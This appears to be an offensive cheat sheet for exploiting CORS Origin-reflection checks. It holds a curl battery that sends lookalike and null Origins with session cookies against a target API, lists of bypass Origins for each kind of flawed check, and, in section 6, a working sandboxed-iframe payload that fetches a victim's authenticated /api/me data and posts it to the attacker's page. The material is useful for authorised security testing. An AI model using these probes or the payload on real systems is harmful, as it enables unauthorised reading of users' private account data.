# Origin reflection — the echo-check bypasses

The server decides which Origin to allow. The check's logic — exact,
substring, prefix, suffix, regex, null — and how each fails.

---

## 1. The check shapes — how the server validates Origin

```python
# the spectrum from broken to solid:
origin = request.headers['Origin']
if origin: allow(origin)                    # reflect anything — open
if 'target.com' in origin: allow(origin)    # substring — bypassable
if origin.startswith('https://target.com'): allow(origin)  # prefix — bypassable
if origin.endswith('.target.com'): allow(origin)  # suffix — subdomain-trust
if re.match(r'.*target\.com.*', origin): allow(origin)  # regex — bypassable
if origin == 'https://app.target.com': allow(origin)    # exact — solid
if origin in ALLOWLIST: allow(origin)                  # list — solid on the list
```

## 2. The reflection-test battery — every Origin shape

```bash
# send each Origin; read whether the server reflects or accepts it
for o in 'https://evil.com' \
         'https://target.com.evil.com' \
         'https://evil-target.com' \
         'https://eviltarget.com' \
         'https://sub.target.com' \
         'https://target.com.evil.com' \
         'https://target.com@evil.com' \
         'https://evil.com?target.com' \
         'null' \
         'https://target.com%60.evil.com' \
         'https://target.com_.evil.com' \
         'https://target.com-.evil.com'; do
  echo "=== $o ==="
  curl -s -i -b "$CJ" "$BASE/api/me" -H "Origin: $o" | grep -i 'access-control-allow-origin'
done
```

Each Origin that reflects or passes = a bypass of the intended check.

## 3. The substring-match bypasses

```text
the check: 'target.com' in origin
bypass Origins:
- https://target.com.evil.com      — 'target.com' is a substring
- https://evil.com/target.com      — path — but Origin has no path;
                                     the host is evil.com — fails
- https://target.com@evil.com      — userinfo — host is evil.com;
                                     'target.com' is in the string
- https://evil.com?target.com      — query — host is evil.com;
                                     'target.com' in the string
- https://eviltarget.com           — 'target.com' inside 'eviltarget'
```

## 4. The prefix-match bypasses

```text
the check: origin.startswith('https://target.com')
bypass:
- https://target.com.evil.com   — starts with the string
- https://target.com.evil       — same
NOT:
- https://evil.com              — doesn't start with it
- https://eviltarget.com        — doesn't start with 'target.com'
```

## 5. The suffix-match bypasses — the subdomain-trust

```text
the check: origin.endswith('.target.com') or host.endswith('.target.com')
bypass — a subdomain you control:
- https://evil.target.com       — a subdomain-XSS, a takeover, a
                                  shared-hosting subdomain
NOT:
- https://eviltarget.com        — doesn't end with '.target.com'
- https://target.com.evil.com   — ends with '.evil.com'
```

The subdomain-trust opens every `*.target.com` — a subdomain-XSS or
a dangling-CNAME takeover is the carrier.

## 6. The `null` origin — the opaque-shape bypass

```text
the check: origin == 'null' or 'null' in allowlist
a page with an opaque origin sends Origin: null:
- a sandboxed iframe (no allow-same-origin)
- a data: URL
- a file: page
- a redirect through an opaque context
```

```html
<iframe sandbox="allow-scripts" src="data:text/html,
<script>fetch('https://t/api/me',{credentials:'include'})
.then(r=>r.text()).then(d=>parent.postMessage(d,'*'))</script>">
</iframe>
```

## 7. The parser-differential bypasses — URL-parsing tricks

```text
the check parses Origin's host differently than the browser:
- https://target.com.evil.com   — check sees 'target.com' substring;
                                  browser sees host 'target.com.evil.com'
- https://evil.com#target.com   — fragment — host is evil.com
- https://target.com%60.evil.com — backtick-encoded — some parsers
                                  split wrong
- https://target.com_.evil.com  — underscore — an invalid-host trick
- https://target.com-.evil.com  — a hyphenated lookalike
- https://target.com%2eevil.com — encoded dot — parser may decode
```

The URL-parser divergence between the server's check and the
browser's URL model is the bypass surface.

## 8. The case/whitespace/unicode bypasses

```text
- HTTPS://TARGET.COM          — case — a case-sensitive check misses
- https://target.com.         — a trailing dot — a valid FQDN variant
- https://target.com:443      — an explicit port — a port-check gap
- https://evil.com:443        — a port the check didn't expect
- unicode/punycode lookalikes — a homoglyph host
```

## 9. The "the check reads a different header" — proxy confusion

```text
- the check reads Referer not Origin — a Referer-bypass set
- the check reads X-Origin or a proxy-set header — spoofable
- the check reads the Host header — a host-confusion
```

## 10. The bypass→carrier table

| Check | The bypass Origin |
|---|---|
| reflect-all | any |
| substring | `target.com.evil.com`, `evil.com?target.com`, `target.com@evil.com` |
| prefix | `target.com.evil.com` |
| suffix `.target.com` | `evil.target.com` (a subdomain you control) |
| `null` allowed | a sandboxed/data: page |
| regex loose | a lookalike containing 'target.com' |
| exact match | dead unless a subdomain is allowed |
| parser-differential | `%60`, `_`, `-`, `%2e`, `@`, `#` hosts |

## 11. The falsifier

```text
the check is an exact-match or a strict allowlist (no substring/
prefix/null/subdomain/parser gap) — no Origin you can produce passes.
a fixed allowlist that only names app.target.com + no subdomain-
trust + no null → the read is closed.
```

## 12. The ledger

```bash
python3 tools/state.py <c> --hypothesis \
  "origin-reflection: <check-shape> -> <the bypass Origin>"
```
